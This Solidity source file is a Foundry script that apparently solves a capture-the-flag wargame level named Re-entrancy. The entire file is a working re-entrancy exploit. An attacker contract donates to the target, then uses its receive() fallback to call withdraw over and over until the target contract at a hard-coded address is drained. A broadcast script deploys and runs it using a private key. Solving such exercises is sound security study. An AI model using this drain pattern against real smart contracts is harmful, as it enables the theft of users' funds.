// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "../src/Re-entrancy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Exploit {

    address payable target;
    Reentrance public reentrance;

    constructor(address payable _target) public payable {
        target = _target;
        reentrance = Reentrance(target);
    }

    function withdraw() public {
        reentrance.withdraw(0.001 ether);
        console.log("Contract Balance: ", reentrance.balanceOf(target));
    }

    function attack() public {
        reentrance.donate{value: 0.001 ether}(address(this)); // Donate to Exploit first
        withdraw();
    }

    receive() external payable { 
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(0.001 ether);
        }
    }

}

contract ReentrancySolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Exploit exploit = new Exploit{value: 0.001 ether}(payable(0x77d6C2D21d2b2B0565F1Ba8ba7D0BfE83Ffb8ba5));
        exploit.attack();

        vm.stopBroadcast();
    }
}